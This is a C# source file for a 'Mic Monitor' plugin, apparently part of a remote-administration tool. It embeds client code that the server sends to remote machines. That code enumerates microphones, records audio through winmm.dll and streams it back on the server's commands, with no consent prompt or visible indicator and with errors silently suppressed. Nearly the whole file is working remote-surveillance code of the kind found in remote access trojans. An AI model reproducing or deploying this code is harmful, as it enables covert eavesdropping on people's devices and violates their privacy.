// File: Plugins/Builtin/MicMonitorPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class MicMonitorPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, MicMonUI> _clientUIs = new();

        public string PluginId => "micmon";
        public string DisplayName => "Mic Monitor";
        public string Version => "1.0.0";
        public string Description => "Remote microphone live audio streamer.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_micmon
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private volatile bool _recording;
        private int _deviceIndex;
        private int _sampleRate = 16000;
        private int _bitsPerSample = 16;
        private int _channels = 1;
        private int _bufferMs = 100;

        [DllImport(""winmm.dll"")]
        static extern int waveInGetNumDevs();
        [DllImport(""winmm.dll"", CharSet = CharSet.Auto)]
        static extern int waveInGetDevCaps(int deviceId, ref WAVEINCAPS caps, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInOpen(out IntPtr handle, int deviceId, ref WAVEFORMATEX format, WaveInProc callback, IntPtr instance, int flags);
        [DllImport(""winmm.dll"")]
        static extern int waveInClose(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInStart(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInStop(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInReset(IntPtr handle);
        [DllImport(""winmm.dll"")]
        static extern int waveInPrepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInUnprepareHeader(IntPtr handle, IntPtr header, int size);
        [DllImport(""winmm.dll"")]
        static extern int waveInAddBuffer(IntPtr handle, IntPtr header, int size);

        delegate void WaveInProc(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2);

        const int CALLBACK_FUNCTION = 0x00030000;
        const int MM_WIM_DATA = 0x3C4;
        const int WAVE_FORMAT_PCM = 1;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct WAVEINCAPS
        {
            public short wMid, wPid;
            public int vDriverVersion;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string szPname;
            public int dwFormats;
            public short wChannels;
            public short wReserved1;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX
        {
            public short wFormatTag;
            public short nChannels;
            public int nSamplesPerSec;
            public int nAvgBytesPerSec;
            public short nBlockAlign;
            public short wBitsPerSample;
            public short cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEHDR
        {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesRecorded;
            public IntPtr dwUser;
            public int dwFlags;
            public int dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        IntPtr _waveIn = IntPtr.Zero;
        WaveInProc _waveInProc;
        List<IntPtr> _headers = new List<IntPtr>();
        List<IntPtr> _buffers = new List<IntPtr>();
        const int NUM_BUFFERS = 6;
        volatile int _sending;

        async Task LogA(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                await _send(m);
            }
            catch { }
        }

        List<string[]> GetDevices()
        {
            var list = new List<string[]>();
            try
            {
                int count = waveInGetNumDevs();
                for (int i = 0; i < count; i++)
                {
                    WAVEINCAPS caps = new WAVEINCAPS();
                    if (waveInGetDevCaps(i, ref caps, Marshal.SizeOf(typeof(WAVEINCAPS))) == 0)
                        list.Add(new string[] { i.ToString(), caps.szPname ?? (""Device "" + i) });
                }
            }
            catch { }
            return list;
        }

        async Task SendDeviceList()
        {
            var devs = GetDevices();
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < devs.Count; i++)
            {
                sb.Append(devs[i][0]);
                sb.Append(""|"");
                sb.Append(devs[i][1]);
                if (i < devs.Count - 1) sb.Append(""\n"");
            }
            byte[] ib = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] msg = new byte[ib.Length + 1];
            msg[0] = 0x06;
            Buffer.BlockCopy(ib, 0, msg, 1, ib.Length);
            await _send(msg);
        }

        async Task SendAck(byte c, string m)
        {
            byte[] mb = Encoding.UTF8.GetBytes(m);
            byte[] msg = new byte[mb.Length + 2];
            msg[0] = 0xFE; msg[1] = c;
            Buffer.BlockCopy(mb, 0, msg, 2, mb.Length);
            await _send(msg);
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();
            _waveInProc = new WaveInProc(WaveCallback);

            string initError = null;
            try
            {
                var devs = GetDevices();
                await LogA(""[INIT] Devices="" + devs.Count);
                for (int i = 0; i < devs.Count; i++)
                    await LogA(""[INIT] Dev"" + i + "": "" + devs[i][1]);
                await SendDeviceList();
            }
            catch (Exception ex) { initError = ex.GetType().Name + "": "" + ex.Message; }
            if (initError != null) { await LogA(""[INIT] FATAL: "" + initError); return; }

            var rxTask = Task.Run(async () =>
            {
                try
                {
                    while (!_cts.IsCancellationRequested)
                    {
                        byte[] data = null;
                        bool fail = false;
                        try { data = await receiveData(); } catch { fail = true; }
                        if (fail || data == null || data.Length == 0) break;
                        string err = null;
                        try { await HandleCmd(data); } catch (Exception ex) { err = ex.Message; }
                        if (err != null) await LogA(""[ERR] "" + err);
                    }
                }
                catch { }
            });

            await rxTask;
            StopRecording();
            _cts.Cancel();
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            byte[] p = new byte[data.Length - 1];
            if (p.Length > 0) Buffer.BlockCopy(data, 1, p, 0, p.Length);

            switch (cmd)
            {
                case 0x01:
                    if (p.Length >= 5)
                    {
                        _deviceIndex = p[0];
                        _sampleRate = p[1] | (p[2] << 8);
                        _bufferMs = p[3] | (p[4] << 8);
                        if (_sampleRate < 8000) _sampleRate = 8000;
                        if (_sampleRate > 48000) _sampleRate = 48000;
                        if (_bufferMs < 20) _bufferMs = 20;
                        if (_bufferMs > 1000) _bufferMs = 1000;
                    }
                    StopRecording();
                    StartRecording();
                    await SendAck(0x01, ""Recording dev="" + _deviceIndex + "" rate="" + _sampleRate + "" buf="" + _bufferMs + ""ms"");
                    break;

                case 0x02:
                    StopRecording();
                    await SendAck(0x02, ""Stopped"");
                    break;

                case 0x03:
                    if (p.Length >= 2)
                    {
                        int newRate = p[0] | (p[1] << 8);
                        if (newRate >= 8000 && newRate <= 48000 && newRate != _sampleRate)
                        {
                            _sampleRate = newRate;
                            if (_recording) { StopRecording(); StartRecording(); }
                        }
                    }
                    if (p.Length >= 4)
                    {
                        int newBuf = p[2] | (p[3] << 8);
                        if (newBuf >= 20 && newBuf <= 1000 && newBuf != _bufferMs)
                        {
                            _bufferMs = newBuf;
                            if (_recording) { StopRecording(); StartRecording(); }
                        }
                    }
                    break;

                case 0x04:
                    if (p.Length >= 1)
                    {
                        _deviceIndex = p[0];
                        if (_recording)
                        {
                            StopRecording();
                            StartRecording();
                            await SendAck(0x04, ""Switched to dev="" + _deviceIndex);
                        }
                    }
                    await SendDeviceList();
                    break;

                case 0x06:
                    await SendDeviceList();
                    break;
            }
        }

        void StartRecording()
        {
            if (_recording) return;
            try
            {
                WAVEFORMATEX fmt = new WAVEFORMATEX();
                fmt.wFormatTag = WAVE_FORMAT_PCM;
                fmt.nChannels = (short)_channels;
                fmt.nSamplesPerSec = _sampleRate;
                fmt.wBitsPerSample = (short)_bitsPerSample;
                fmt.nBlockAlign = (short)(_channels * _bitsPerSample / 8);
                fmt.nAvgBytesPerSec = _sampleRate * _channels * _bitsPerSample / 8;
                fmt.cbSize = 0;

                int result = waveInOpen(out _waveIn, _deviceIndex, ref fmt, _waveInProc, IntPtr.Zero, CALLBACK_FUNCTION);
                if (result != 0)
                {
                    try
                    {
                        byte[] b = Encoding.UTF8.GetBytes(""waveInOpen failed: "" + result);
                        byte[] m = new byte[b.Length + 1];
                        m[0] = 0xFD;
                        Buffer.BlockCopy(b, 0, m, 1, b.Length);
                        _send(m).Wait(500);
                    }
                    catch { }
                    return;
                }

                int bufferSize = fmt.nAvgBytesPerSec * _bufferMs / 1000;
                int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));

                for (int i = 0; i < NUM_BUFFERS; i++)
                {
                    IntPtr bufPtr = Marshal.AllocHGlobal(bufferSize);
                    IntPtr hdrPtr = Marshal.AllocHGlobal(hdrSize);

                    WAVEHDR hdr = new WAVEHDR();
                    hdr.lpData = bufPtr;
                    hdr.dwBufferLength = bufferSize;
                    hdr.dwBytesRecorded = 0;
                    hdr.dwUser = IntPtr.Zero;
                    hdr.dwFlags = 0;
                    hdr.dwLoops = 0;
                    Marshal.StructureToPtr(hdr, hdrPtr, false);
                    waveInPrepareHeader(_waveIn, hdrPtr, hdrSize);
                    waveInAddBuffer(_waveIn, hdrPtr, hdrSize);

                    _headers.Add(hdrPtr);
                    _buffers.Add(bufPtr);
                }

                _recording = true;
                waveInStart(_waveIn);
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] b = Encoding.UTF8.GetBytes(""StartRecording failed: "" + ex.Message);
                    byte[] m = new byte[b.Length + 1];
                    m[0] = 0xFD;
                    Buffer.BlockCopy(b, 0, m, 1, b.Length);
                    _send(m).Wait(500);
                }
                catch { }
                StopRecording();
            }
        }

        void StopRecording()
        {
            _recording = false;
            try
            {
                if (_waveIn != IntPtr.Zero)
                {
                    waveInStop(_waveIn);
                    waveInReset(_waveIn);

                    int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));
                    foreach (IntPtr h in _headers)
                    {
                        try { waveInUnprepareHeader(_waveIn, h, hdrSize); } catch { }
                        Marshal.FreeHGlobal(h);
                    }
                    foreach (IntPtr b in _buffers)
                        Marshal.FreeHGlobal(b);

                    _headers.Clear();
                    _buffers.Clear();

                    waveInClose(_waveIn);
                    _waveIn = IntPtr.Zero;
                }
            }
            catch { }
        }

        void WaveCallback(IntPtr handle, int msg, IntPtr instance, IntPtr param1, IntPtr param2)
        {
            if (msg != MM_WIM_DATA || !_recording) return;
            try
            {
                WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(param1, typeof(WAVEHDR));
                int recorded = hdr.dwBytesRecorded;

                if (recorded > 0)
                {
                    byte[] audio = new byte[recorded];
                    Marshal.Copy(hdr.lpData, audio, 0, recorded);

                    byte[] packet = new byte[9 + recorded];
                    packet[0] = 0x30;
                    packet[1] = (byte)(_sampleRate & 0xFF);
                    packet[2] = (byte)((_sampleRate >> 8) & 0xFF);
                    packet[3] = (byte)_bitsPerSample;
                    packet[4] = (byte)_channels;
                    packet[5] = (byte)(recorded & 0xFF);
                    packet[6] = (byte)((recorded >> 8) & 0xFF);
                    packet[7] = (byte)((recorded >> 16) & 0xFF);
                    packet[8] = (byte)((recorded >> 24) & 0xFF);
                    Buffer.BlockCopy(audio, 0, packet, 9, recorded);

                    if (Interlocked.CompareExchange(ref _sending, 0, 0) < 8)
                    {
                        Interlocked.Increment(ref _sending);
                        _send(packet).ContinueWith(delegate { Interlocked.Decrement(ref _sending); });
                    }
                }

                if (_recording && _waveIn != IntPtr.Zero)
                {
                    int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));
                    waveInAddBuffer(_waveIn, param1, hdrSize);
                }
            }
            catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new MicMonUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }


}